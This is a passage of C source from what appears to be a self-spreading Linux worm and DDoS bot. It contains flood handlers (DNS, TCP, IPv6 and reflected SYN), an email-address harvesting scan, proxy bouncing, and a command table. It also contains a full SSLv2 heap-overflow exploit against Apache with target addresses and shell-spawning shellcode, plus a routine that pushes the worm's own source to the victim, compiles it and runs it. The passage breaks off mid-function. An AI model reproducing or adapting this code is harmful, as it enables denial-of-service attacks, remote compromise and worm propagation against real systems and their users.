	convo=buf+sizeof(struct df_rec);
	convo[rp->h.len]=0;
	_decrypt(convo,rp->h.len);
	for (i=0,startm=0;i<=rp->h.len;i++) if (convo[i] == '.' || convo[i] == 0) {
		convo[i]=0;
		sprintf(dnsp.buf+mlen,"%c%s",(unsigned char)(i-startm),convo+startm);
		mlen+=1+strlen(convo+startm);
		startm=i+1;
	}
	dnsp.buf[mlen++]=0;
	dnsp.buf[mlen++]=0;
	dnsp.buf[mlen++]=1;
	dnsp.buf[mlen++]=0;
	dnsp.buf[mlen++]=1;
	while(1) {
		dnsp.id=rand();
		if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
		else {
#ifdef WIN32
			ioctlsocket(fd, FIONBIO, (unsigned long*)&flag);
#else
			flag = fcntl(fd, F_GETFL, 0);
			flag |= O_NONBLOCK;
			fcntl(fd, F_SETFL, flag);
#endif
			sendto(fd,(char*)&dnsp,sizeof(struct dns)+mlen-128,0,(struct sockaddr*)&in,sizeof(in));
			close(fd);
		}
		if (i >= 50) {
			if (time(NULL) >= start+rp->secs) return;
			i=0;
		}
		i++;
	}
	return;
}

/**** Linux: WORKS - Windows: NOT IMPLIMENTED ****/
void ipv6flood(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
#ifdef AF_INET6
#ifndef WIN32
	unsigned long flag=1;
	int fd,i=0,j=0;
	struct sockaddr_in6 in;
	time_t start=time(NULL);
	struct tcp6_rec *rp=(struct tcp6_rec *)buf;
	if (len < sizeof(struct tcp6_rec)) return;
	memset((void*)&in,0,sizeof(struct sockaddr_in6));
	memcpy(in.sin6_addr.s6_addr,rp->target,16);
	in.sin6_family=AF_INET6;
	in.sin6_port=htons(rp->port);
	while(1) {
		if (rp->port == 0) in.sin6_port = rand();
		if ((fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP)) < 0);
		else {
			flag = fcntl(fd, F_GETFL, 0);
			flag |= O_NONBLOCK;
			fcntl(fd, F_SETFL, flag);
			connect(fd, (struct sockaddr *)&in, sizeof(in));
			close(fd);
		}
		if (i >= 50) {
			if (time(NULL) >= start+rp->secs) return;
			i=0;
		}
		i++;
	}
	return;
#endif
#endif
}


/**** Linux: WORKS - Windows: WORKS ****/
void list(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	struct list_rec *rp=(struct list_rec *)buf;
	if (len < sizeof(struct list_rec)) return;
	syncm(udpclient,0x46,rp->h.id);
}

////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////

/**** Linux: UNTESTED - Windows: NOT IMPLIMENTED ****/
void drdos(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
#ifndef WIN32
	int enable=1,sock;
	char *que=NULL,*tmp;
	struct _plist {
		unsigned long name;
		unsigned short port;
		struct _plist *next;
	} *plist=NULL;
	struct drdos_rec *rp=(struct drdos_rec *)buf;
	if (len < sizeof(struct drdos_rec) || rp->h.len > len) return;
	if (!isreal(rp->target)) {
		sendmessage(udpclient,rp->h.id,"Cannot packet local networks");
		return;
	}
	tmp=(char*)myalloc(rp->h.len+3);
	memset(tmp,0,rp->h.len+3);
	memcpy(tmp,buf+sizeof(struct drdos_rec),rp->h.len);
	_decrypt(tmp,rp->h.len);
	if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
		sendmessage(udpclient,rp->h.id,"Unable to create socket");
		return;
	}
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&enable, sizeof(enable)) == -1) {
		sendmessage(udpclient,rp->h.id,"Unable to set socket options");
		return;
	}
	if (*tmp != '/') {
		struct ainst *a=getwebsite(tmp);
		if (!a) {
			sendmessage(udpclient,rp->h.id,"Unable to download");
			return;
		}
		while(1) {
			unsigned long offset=0,i,len=0;
			char *buf,*str;
			fd_set read;
			struct timeval tm;
			FD_ZERO(&read);
			FD_SET(a->sock,&read);
			memset((void*)&tm,0,sizeof(struct timeval));
			tm.tv_sec=60;
			tm.tv_usec=0;
			if (select(a->sock+1,&read,NULL,NULL,&tm) <= 0) {
				if (que) myfree(que);
				break;
			}
			if (que) {
				offset=strlen(que);
				buf=(char*)myalloc(strlen(que)+LINEMAX);
				if (!buf) break;
				memset(buf,0,strlen(que)+LINEMAX);
				strcpy(buf,que);
				myfree(que);
				que=NULL;
			}
			else {
				buf=(char*)myalloc(LINEMAX);
				if (!buf) break;
				memset(buf,0,LINEMAX);
			}
			if (atcp_recv(a,buf+offset,LINEMAX-2) != 0) {
				myfree(buf);
				break;
			}
			str=buf;
			len+=offset;
			for (i=0;i<strlen(str);i++) {
				if (str[i] == '\n') {
					unsigned long j,b=0;
					str[i]=0;

					for (j=0;j<strlen(str);j++) if (str[j] == ':') {
						str[j]=0;
						b=1;
						break;
					}
					if (b) {
						struct _plist *getb=plist,*newb;
						unsigned long server=inet_addr(str);
						while(getb != NULL && b) {
							if (server == getb->name) b=0;
							getb=getb->next;
						}
						if (b) {
							newb=(struct _plist *)myalloc(sizeof(struct _plist));
							if (!newb) return;
							newb->name=server;
							newb->port=atol(str+j+1);
							newb->next=plist;
							plist=newb;
						}
					}

					str+=i+1;
					i=-1;
					if (str > buf+len) break;
				}
			}
			if (str <= buf+len) {
				if (strlen(str)+2 < 32000) {
					que=(char*)myalloc(strlen(str)+2);
					if (!que) break;
					memset(que,0,strlen(str)+2);
					strcpy(que,str);
				}
			}
			myfree(buf);
		}
	}
	else {
		FILE *f=fopen(tmp,"r");
		if (!f) {
			sendmessage(udpclient,rp->h.id,"Unable to open file");
			return;
		}
		while(1) {
			char buf[1025],*str=buf;
			unsigned long j,b=0;
			memset(buf,0,1025);
			fgets(buf,1024,f);
			if (feof(f)) break;
			for (j=0;j<strlen(str);j++) if (str[j] == ':') {
				str[j]=0;
				b=1;
				break;
			}
			if (b) {
				struct _plist *getb=plist,*newb;
				unsigned long server=inet_addr(str);
				while(getb != NULL && b) {
					if (server == getb->name) b=0;
					getb=getb->next;
				}
				if (b) {
					newb=(struct _plist *)myalloc(sizeof(struct _plist));
					if (!newb) return;
					newb->name=server;
					newb->port=atol(str+j+1);
					newb->next=plist;
					plist=newb;
				}
			}
		}
	}
	myfree(tmp);
	sendmessage(udpclient,rp->h.id,"Starting DrDos");
	if (plist) {
		time_t start=time(NULL);
		struct _plist *getb=plist;
		unsigned short i=0;
		while(1) {
			send_syn(sock, rp->target, getb->name,getb->port);
			if (i >= 50) {
				if (time(NULL) >= start+rp->secs) return;
				i=0;
			}
			i++;
			getb=getb->next;
			if (getb == NULL) getb=plist;
		}
	}
	else {
		sendmessage(udpclient,rp->h.id,"No list avaliable to packet");
		return;
	}
#endif
	return;
}

/**** Linux: UNTESTED - Windows: NOT IMPLIMENTED ****/
void emailscan(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
#ifndef WIN32
	char ip[256];
	struct escan_rec *rp=(struct escan_rec *)buf;
	if (len < sizeof(struct escan_rec)) return;
	if (!isreal(rp->ip)) {
		sendmessage(udpclient,rp->h.id,"Invalid IP");
		return;
	}
	conv(ip,256,rp->ip);
	if (mfork() == 0) {
		struct _linklist *getb;
		struct ainst client;
		StartScan("/");
		audp_setup(&client,(char*)ip,ESCANPORT);
		getb=linklist;
		while(getb != NULL) {
			unsigned long len=strlen(getb->name);
			audp_send(&client,&getb->name,1,&len);
			getb=getb->next;
		}
		audp_close(&client);
		return;
	}
#endif
}

/**** Linux: UNTESTED - Windows: UNTESTED ****/
void openbounce(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	struct add_rec *sr=(struct add_rec *)buf;
	unsigned long n;
	if (len < sizeof(struct add_rec)) return;
	for (n=0;n<CLIENTS;n++) if (clients[n].sock == 0) {
		char srv[256];
		if (sr->socks == 0) conv(srv,256,sr->server);
		else conv(srv,256,sr->socks);
		clients[n].ext2=TCP_PENDING;
		clients[n].ext3=sr->h.id;
		clients[n].ext=(struct ainst*)myalloc(sizeof(struct ainst));
		if (!clients[n].ext) {
			clients[n].sock=0;
			break;
		}
		memcpy((void*)clients[n].ext,(void*)udpclient,sizeof(struct ainst));
		if (sr->socks == 0) {
			clients[n].ext5=NULL;
			atcp_sync_connect(&clients[n],srv,sr->port);
		}
		else {
			clients[n].ext5=(char*)myalloc(9);
			if (!clients[n].ext5) {
				clients[n].sock=0;
				break;
			}
			((char*)clients[n].ext5)[0]=0x04;
			((char*)clients[n].ext5)[1]=0x01;
			((char*)clients[n].ext5)[2]=((char*)&sr->port)[1];
			((char*)clients[n].ext5)[3]=((char*)&sr->port)[0];
			((char*)clients[n].ext5)[4]=((char*)&sr->server)[0];
			((char*)clients[n].ext5)[5]=((char*)&sr->server)[1];
			((char*)clients[n].ext5)[6]=((char*)&sr->server)[2];
			((char*)clients[n].ext5)[7]=((char*)&sr->server)[3];
			((char*)clients[n].ext5)[8]=0x00;
			atcp_sync_connect(&clients[n],srv,1080);
		}
		if (sr->bind) abind(&clients[n],sr->bind,0);
		break;
	}
}

/**** Linux: UNTESTED - Windows: UNTESTED ****/
void closebounce(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	struct kill_rec *sr=(struct kill_rec *)buf;
	unsigned long n;
	if (len < sizeof(struct kill_rec)) return;
	for (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {
		myfree(clients[n].ext);
		myfree(clients[n].ext5);
		atcp_close(&clients[n]);
	}
}

/**** Linux: UNTESTED - Windows: UNTESTED ****/
void msgbounce(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	struct data_rec *sr=(struct data_rec *)buf;
	unsigned long n;
	if (len < sizeof(struct data_rec) || sr->h.len > len) return;
	for (n=0;n<CLIENTS;n++) if (clients[n].ext3 == sr->h.id) {
		_decrypt(buf+sizeof(struct data_rec),sr->h.len);
		atcp_send(&clients[n],buf+sizeof(struct data_rec),sr->h.len);
	}
}

//////////////////////////////////////////////////////////////////////////////////////
//                         Tags are as followed:                                    //
//                                                                                  //
//   0x10 - 0x3F     client to server tags                                          //
//   0x40 - 0x6F     server to client tags                                          //
//   0x70 - 0x9F     server to server tags                                          //
//                                                                                  //
//////////////////////////////////////////////////////////////////////////////////////

struct PFuncs { unsigned char id; void (*func)(struct ainst *,unsigned char *,unsigned long); int wait; } funcs[] = {
	{ 0x10, NULL, 0 },
	{ 0x11, NULL, 0 },
	{ 0x12, NULL, 0 },
	{ 0x13, NULL, 0 },
	{ 0x14, NULL, 0 },
	{ 0x15, NULL, 0 },
	{ 0x16, NULL, 0 },
	{ 0x17, NULL, 0 },
	{ 0x18, NULL, 0 },
	{ 0x19, NULL, 0 },
	{ 0x1A, NULL, 0 },
	{ 0x1B, NULL, 0 },
	{ 0x1C, NULL, 0 },
	{ 0x1D, NULL, 0 },
	{ 0x1F, NULL, 0 },
	{ 0x20, info, 0 },
	{ 0x21, openbounce, 0 },
	{ 0x22, closebounce, 0 },
	{ 0x23, msgbounce, 0 },
	{ 0x24, run, 1 },
	{ 0x25, update, 1 },
	{ 0x26, NULL, 0 }, // RESERVED!
	{ 0x27, NULL, 0 },
	{ 0x28, list, 0 },
	{ 0x29, udpflood, 1 },
	{ 0x2A, tcpflood, 1 },
	{ 0x2B, ipv6flood, 1 },
	{ 0x2C, dnsflood, 1 },
	{ 0x2D, emailscan, 0 },
	{ 0x2F, drdos, 1 },
	{ 0x30, NULL, 0 },
	{ 0x31, NULL, 0 },
	{ 0x32, NULL, 0 },
	{ 0x33, NULL, 0 },
	{ 0x34, NULL, 0 },
	{ 0x35, NULL, 0 },
	{ 0x36, NULL, 0 },
	{ 0x37, NULL, 0 },
	{ 0x38, NULL, 0 },
	{ 0x39, NULL, 0 },
	{ 0x3A, NULL, 0 },
	{ 0x3B, NULL, 0 },
	{ 0x3C, NULL, 0 },
	{ 0x3D, NULL, 0 },
	{ 0x3F, NULL, 0 },
{ 0, (void *)0 }, 0 };

//////////////////////////////////////////////////////////////////////////////////////
//                                    Exploit                                       //
//////////////////////////////////////////////////////////////////////////////////////

#ifdef SCAN
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/x509.h>
#include <openssl/evp.h>

char *GetAddress(char *ip) {
	struct sockaddr_in sin;
	fd_set fds;
	int n,d,sock;
	char buf[1024];
	struct timeval tv;
	sock = socket(PF_INET, SOCK_STREAM, 0);
	sin.sin_family = PF_INET;
	sin.sin_addr.s_addr = inet_addr(ip);
	sin.sin_port = htons(80);
	if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;
	write(sock,"GET / HTTP/1.1\r\n\r\n",strlen("GET / HTTP/1.1\r\n\r\n"));
	tv.tv_sec = 15;
	tv.tv_usec = 0;
	FD_ZERO(&fds);
	FD_SET(sock, &fds);
	memset(buf, 0, sizeof(buf));
	if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
		if(FD_ISSET(sock, &fds)) {
			if((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;
			for (d=0;d<n;d++) if (!strncmp(buf+d,"Server: ",strlen("Server: "))) {
				char *start=buf+d+strlen("Server: ");
				for (d=0;d<strlen(start);d++) if (start[d] == '\n') start[d]=0;
				cleanup(start);
				return strdup(start);
			}
		}
	}
	return NULL;
}

#define	ENC(c) ((c) ? ((c) & 077) + ' ': '`')

int sendch(int sock,int buf) {
	char a[2];
	int b=1;
	if (buf == '`' || buf == '\\' || buf == '$') {
		a[0]='\\';
		a[1]=0;
		b=write(sock,a,1);
	}
	if (b <= 0) return b;
	a[0]=buf;
	a[1]=0;
	return write(sock,a,1);
}

int writem(int sock, char *str) {
	return write(sock,str,strlen(str));
}

int encode(int a) {
	register int ch, n;
	register char *p;
	char buf[80];
	FILE *in;
	if ((in=fopen("/tmp/.b.c","r")) == NULL) return 0;
	writem(a,"begin 655 .b.c\n");
	while ((n = fread(buf, 1, 45, in))) {
		ch = ENC(n);
		if (sendch(a,ch) <= ASUCCESS) break;
		for (p = buf; n > 0; n -= 3, p += 3) {
			if (n < 3) {
				p[2] = '\0';
				if (n < 2) p[1] = '\0';
			}
			ch = *p >> 2;
			ch = ENC(ch);
			if (sendch(a,ch) <= ASUCCESS) break;
			ch = ((*p << 4) & 060) | ((p[1] >> 4) & 017);
			ch = ENC(ch);
			if (sendch(a,ch) <= ASUCCESS) break;
			ch = ((p[1] << 2) & 074) | ((p[2] >> 6) & 03);
			ch = ENC(ch);
			if (sendch(a,ch) <= ASUCCESS) break;
			ch = p[2] & 077;
			ch = ENC(ch);
			if (sendch(a,ch) <= ASUCCESS) break;
		}
		ch='\n';
		if (sendch(a,ch) <= ASUCCESS) break;
		usleep(10);
	}
	if (ferror(in)) {
		fclose(in);
		return 0;
	}
	ch = ENC('\0');
	sendch(a,ch);
	ch = '\n';
	sendch(a,ch);
	writem(a,"end\n");
	if (in) fclose(in);
	return 1;
}

#define MAX_ARCH 21

struct archs {
	char *os;
	char *apache;
	int func_addr;
} architectures[] = {
	{"Gentoo", "", 0x08086c34},
	{"Debian", "1.3.26", 0x080863cc},
	{"Red-Hat", "1.3.6", 0x080707ec},
	{"Red-Hat", "1.3.9", 0x0808ccc4},
	{"Red-Hat", "1.3.12", 0x0808f614},
	{"Red-Hat", "1.3.12", 0x0809251c},
	{"Red-Hat", "1.3.19", 0x0809af8c},
	{"Red-Hat", "1.3.20", 0x080994d4},
	{"Red-Hat", "1.3.26", 0x08161c14},
	{"Red-Hat", "1.3.23", 0x0808528c},
	{"Red-Hat", "1.3.22", 0x0808400c},
	{"SuSE", "1.3.12", 0x0809f54c},
	{"SuSE", "1.3.17", 0x08099984},
	{"SuSE", "1.3.19", 0x08099ec8},
	{"SuSE", "1.3.20", 0x08099da8},
	{"SuSE", "1.3.23", 0x08086168},
	{"SuSE", "1.3.23", 0x080861c8},
	{"Mandrake", "1.3.14", 0x0809d6c4},
	{"Mandrake", "1.3.19", 0x0809ea98},
	{"Mandrake", "1.3.20", 0x0809e97c},
	{"Mandrake", "1.3.23", 0x08086580},
	{"Slackware", "1.3.26", 0x083d37fc},
	{"Slackware", "1.3.26",0x080b2100}
};

extern int errno;

int cipher;
int ciphers;

#define FINDSCKPORTOFS	   208 + 12 + 46

unsigned char overwrite_session_id_length[] =
	"AAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"\x70\x00\x00\x00";

unsigned char overwrite_next_chunk[] =
	"AAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAA"
	"\x00\x00\x00\x00"
	"\x00\x00\x00\x00"
	"AAAA"
	"\x01\x00\x00\x00"
	"AAAA"
	"AAAA"
	"AAAA"
	"\x00\x00\x00\x00"
	"AAAA"
	"\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00"
	"AAAAAAAA"

	"\x00\x00\x00\x00"
	"\x11\x00\x00\x00"
	"fdfd"
	"bkbk"
	"\x10\x00\x00\x00"
	"\x10\x00\x00\x00"

	"\xeb\x0a\x90\x90"
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90"

	"\x31\xdb"
	"\x89\xe7"
	"\x8d\x77\x10"
	"\x89\x77\x04"
	"\x8d\x4f\x20"
	"\x89\x4f\x08"
	"\xb3\x10"
	"\x89\x19"
	"\x31\xc9"
	"\xb1\xff"
	"\x89\x0f"
	"\x51"
	"\x31\xc0"
	"\xb0\x66"
	"\xb3\x07"
	"\x89\xf9"
	"\xcd\x80"
	"\x59"
	"\x31\xdb"
	"\x39\xd8"
	"\x75\x0a"
	"\x66\xb8\x12\x34"
	"\x66\x39\x46\x02"
	"\x74\x02"
	"\xe2\xe0"
	"\x89\xcb"
	"\x31\xc9"
	"\xb1\x03"
	"\x31\xc0"
	"\xb0\x3f"
	"\x49"
	"\xcd\x80"
	"\x41"
	"\xe2\xf6"

	"\x31\xc9"
	"\xf7\xe1"
	"\x51"
	"\x5b"
	"\xb0\xa4"
	"\xcd\x80"

	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80";

#define BUFSIZE 16384
#define CHALLENGE_LENGTH 16
#define RC4_KEY_LENGTH 16
#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)
#define n2s(c,s)	((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))	 )),c+=2)
#define s2n(s,c)	((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)	 )&0xff)),c+=2)

typedef struct {
	int sock;
	unsigned char challenge[CHALLENGE_LENGTH];
	unsigned char master_key[RC4_KEY_LENGTH];
	unsigned char key_material[RC4_KEY_MATERIAL_LENGTH];
	int conn_id_length;
	unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];
	X509 *x509;
	unsigned char* read_key;
	unsigned char* write_key;
	RC4_KEY* rc4_read_key;
	RC4_KEY* rc4_write_key;
	int read_seq;
	int write_seq;
	int encrypted;
} ssl_conn;

long getip(char *hostname) {
	struct hostent *he;
	long ipaddr;
	if ((ipaddr = inet_addr(hostname)) < 0) {
		if ((he = gethostbyname(hostname)) == NULL) exit(-1);
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}	
	return ipaddr;
}

int sh(int sockfd) {
	char localip[256], rcv[1024];
	fd_set rset;
	int maxfd, n;

	alarm(3600);
	writem(sockfd,"TERM=xterm; export TERM=xterm; exec bash -i\n");
	writem(sockfd,"rm -rf /tmp/.b.c;cat > /tmp/.uub << __eof__;\n");
	encode(sockfd);
	writem(sockfd,"__eof__\n");
	conv(localip,256,myip);
	memset(rcv,0,1024);
	sprintf(rcv,"/usr/bin/uudecode -o /tmp/.b.c /tmp/.uub;gcc -o /tmp/.b /tmp/.b.c -lcrypto;/tmp/.b %s;exit;\n",localip);
	writem(sockfd,rcv);
	for (;;) {
		FD_ZERO(&rset);
		FD_SET(sockfd, &rset);
		select(sockfd+1, &rset, NULL, NULL, NULL);
		if (FD_ISSET(sockfd, &rset)) if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) return 0;
	}
}

int get_local_port(int sock) {
	struct sockaddr_in s_in;
	unsigned int namelen = sizeof(s_in);
	if (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) exit(1);
	return s_in.sin_port;
}

int connect_host(char* host, int port) {
	struct sockaddr_in s_in;
	int sock;
	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = getip(host);
	s_in.sin_port = htons(port);
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) exit(1);
	alarm(10);
	if (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) exit(1);
	alarm(0);
	return sock;
}

ssl_conn* ssl_connect_host(char* host, int port) {
	ssl_conn* ssl;
	if (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) exit(1);
	ssl->encrypted = 0;
	ssl->write_seq = 0;
	ssl->read_seq = 0;
	ssl->sock = connect_host(host, port);
	return ssl;
}

char res_buf[30];

int read_data(int sock, unsigned char* buf, int len) {
	int l;
	int to_read = len;
	do {
		if ((l = read(sock, buf, to_read)) < 0) exit(1);
		to_read -= len;
	} while (to_read > 0);
	return len;
}

int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size) {
	int rec_len, padding;
	read_data(ssl->sock, buf, 2);
	if ((buf[0] & 0x80) == 0) {
		rec_len = ((buf[0] & 0x3f) << 8) | buf[1];
		read_data(ssl->sock, &buf[2], 1);
		padding = (int)buf[2];
	}
	else {
		rec_len = ((buf[0] & 0x7f) << 8) | buf[1];
		padding = 0;
	}
	if ((rec_len <= 0) || (rec_len > buf_size)) exit(1);
	read_data(ssl->sock, buf, rec_len);
	if (ssl->encrypted) {
		if (MD5_DIGEST_LENGTH + padding >= rec_len) {
			if ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) return 0;
			else exit(1);
		}
		RC4(ssl->rc4_read_key, rec_len, buf, buf);
		rec_len = rec_len - MD5_DIGEST_LENGTH - padding;
		memmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);
	}
	if (buf[0] == SSL2_MT_ERROR) {
		if (rec_len != 3) exit(1);
		else return 0;
	}
	return rec_len;
}

void send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len) {
	unsigned char buf[BUFSIZE];
	unsigned char* p;
	int tot_len;
	MD5_CTX ctx;
	int seq;
	if (ssl->encrypted) tot_len = rec_len + MD5_DIGEST_LENGTH;
	else tot_len = rec_len;

	if (2 + tot_len > BUFSIZE) exit(1);

	p = buf;
	s2n(tot_len, p);

	buf[0] = buf[0] | 0x80;

	if (ssl->encrypted) {
		seq = ntohl(ssl->write_seq);

		MD5_Init(&ctx);
		MD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);
		MD5_Update(&ctx, rec, rec_len);
		MD5_Update(&ctx, &seq, 4);
		MD5_Final(p, &ctx);

		p+=MD5_DIGEST_LENGTH;

		memcpy(p, rec, rec_len);

		RC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);
	}
	else memcpy(p, rec, rec_len);

	send(ssl->sock, buf, 2 + tot_len, 0);

	ssl->write_seq++;
}

void send_client_hello(ssl_conn *ssl) {
	int i;
	unsigned char buf[BUFSIZE] =
		"\x01"
		"\x00\x02"
		"\x00\x18"
		"\x00\x00"
		"\x00\x10"
		"\x07\x00\xc0\x05\x00\x80\x03\x00"
		"\x80\x01\x00\x80\x08\x00\x80\x06"
		"\x00\x40\x04\x00\x80\x02\x00\x80"
		"";
	for (i = 0; i < CHALLENGE_LENGTH; i++) ssl->challenge[i] = (unsigned char) (rand() >> 24);
	memcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);
	send_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);
}

void get_server_hello(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	unsigned char *p, *end;
	int len;
	int server_version, cert_length, cs_length, conn_id_length;
	int found;

	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);
	if (len < 11) exit(1);

	p = buf;

	if (*(p++) != SSL2_MT_SERVER_HELLO) exit(1);
	if (*(p++) != 0) exit(1);
	if (*(p++) != 1) exit(1);
	n2s(p, server_version);
	if (server_version != 2) exit(1);

	n2s(p, cert_length);
	n2s(p, cs_length);
	n2s(p, conn_id_length);

	if (len != 11 + cert_length + cs_length + conn_id_length) exit(1);
	ssl->x509 = NULL;
	ssl->x509=d2i_X509(NULL,&p,(long)cert_length);
	if (ssl->x509 == NULL) exit(1);
	if (cs_length % 3 != 0) exit(1);

	found = 0;
	for (end=p+cs_length; p < end; p += 3) if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80)) found = 1;

	if (!found) exit(1);

	if (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) exit(1);

	ssl->conn_id_length = conn_id_length;
	memcpy(ssl->conn_id, p, conn_id_length);
}

void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {
	int encrypted_key_length, key_arg_length, record_length;
	unsigned char* p;
	int i;
	EVP_PKEY *pkey=NULL;
	unsigned char buf[BUFSIZE] =
		"\x02"
		"\x01\x00\x80"
		"\x00\x00"
		"\x00\x40"
		"\x00\x08";
	p = &buf[10];
	for (i = 0; i < RC4_KEY_LENGTH; i++) ssl->master_key[i] = (unsigned char) (rand() >> 24);
	pkey=X509_get_pubkey(ssl->x509);
	if (!pkey) exit(1);
	if (pkey->type != EVP_PKEY_RSA) exit(1);
	encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);
	if (encrypted_key_length <= 0) exit(1);
	p += encrypted_key_length;
	if (key_arg_overwrite) {
		for (i = 0; i < 8; i++) *(p++) = (unsigned char) (rand() >> 24);
		memcpy(p, key_arg_overwrite, key_arg_overwrite_len);
		key_arg_length = 8 + key_arg_overwrite_len;
	}
	else key_arg_length = 0;
	p = &buf[6];
	s2n(encrypted_key_length, p);
	s2n(key_arg_length, p);
	record_length = 10 + encrypted_key_length + key_arg_length;
	send_ssl_packet(ssl, buf, record_length);
	ssl->encrypted = 1;
}

void generate_key_material(ssl_conn* ssl) {
	unsigned int i;
	MD5_CTX ctx;
	unsigned char *km;
	unsigned char c='0';
	km=ssl->key_material;
	for (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {
		MD5_Init(&ctx);
		MD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);
		MD5_Update(&ctx,&c,1);
		c++;
		MD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);
		MD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);
		MD5_Final(km,&ctx);
		km+=MD5_DIGEST_LENGTH;
	}
}

void generate_session_keys(ssl_conn* ssl) {
	generate_key_material(ssl);
	ssl->read_key = &(ssl->key_material[0]);
	ssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);
	ssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);
	ssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
}

void get_server_verify(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	int len;
	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);
	if (len != 1 + CHALLENGE_LENGTH) exit(1);
	if (buf[0] != SSL2_MT_SERVER_VERIFY) exit(1);
	if (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) exit(1);
}

void send_client_finished(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	buf[0] = SSL2_MT_CLIENT_FINISHED;
	memcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);
	send_ssl_packet(ssl, buf, 1+ssl->conn_id_length);
}

void get_server_finished(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	int len;
	int i;
	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);
	if (buf[0] != SSL2_MT_SERVER_FINISHED) exit(1);
	if (len <= 112) exit(1);
	cipher = *(int*)&buf[101];
	ciphers = *(int*)&buf[109];
}

void get_server_error(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	int len;
	if ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) exit(1);
}

void exploit(char *ip) {
	int port = 443;
	int i;
	int arch=-1;
	int N = 20;
	ssl_conn* ssl1;
	ssl_conn* ssl2;
	char *a;

	alarm(3600);
	if ((a=GetAddress(ip)) == NULL) exit(0);
	if (strncmp(a,"Apache",6)) exit(0);
	for (i=0;i<MAX_ARCH;i++) {
		if (strstr(a,architectures[i].apache) && strstr(a,architectures[i].os)) {
			arch=i;
			break;
		}
	}
	if (arch == -1) arch=9;

	srand(0x31337);

	for (i=0; i<N; i++) {
		connect_host(ip, port);
		usleep(100000);
	}

	ssl1 = ssl_connect_host(ip, port);
	ssl2 = ssl_connect_host(ip, port);

	send_client_hello(ssl1);
	get_server_hello(ssl1);
	send_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);
	generate_session_keys(ssl1);
	get_server_verify(ssl1);
	send_client_finished(ssl1);
	get_server_finished(ssl1);

	port = get_local_port(ssl2->sock);
